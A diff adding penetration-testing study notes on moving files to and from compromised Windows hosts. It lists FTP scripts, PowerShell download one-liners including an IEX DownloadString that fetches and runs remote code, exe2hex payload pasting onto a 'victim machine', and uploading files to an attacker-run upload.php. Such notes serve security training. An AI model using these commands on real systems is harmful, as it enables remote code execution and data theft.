@@ -23,5 +23,42 @@ non-interactive shell
 transferring file with windows hosts
 ====================================
 non-interactive ftp download
-	windows
-		ftp -s:
+	make ftp command file
+		echo <command> >> <filename>
+		ex.ftp.txt
+	run the file
+		ftp -v -n -s:<filename>
+download using scripting languages
+	make echoing script
+		VBScript : wget.vbs
+		PowerShell : wget.ps1
+		use convert_to_non-interactive_shell.py
+	copy the echoing script
+	paste to the shell
+	run the script
+		VBScript : cscript wget.vbs <target url> <output file>
+		PowerShell : powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+	one liner
+	  simple download
+		powershell.exe (New-Object System.Net.WebClient).DownloadFile('<target url>', '<output file>')
+	  run the target url's commands without saving
+		powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<target url>')
+
+downloads with exe2hex and powershell
+	use packer to compress the binary file
+		upx -9 <binary file>
+	make exe to run with echo command
+		exe2hex -x <binary file> -p <output file>
+	copy the output file content
+	paste it on the victim machine
+
+uploads using windows scripting languages
+	php
+		make a upload php file into attacker machine(upload.php)
+		powershell (New-Object System.Net.Weblient).UploadFile('<target url>', '<upload file>')
+
+uploads with TFTP(up to XP...)
+	install tftp
+	make directory and give permission(own by nobody:)
+	sudo atftpd --daemon --port 69 /tftp
+	tftp -i <target ip> put <filename>
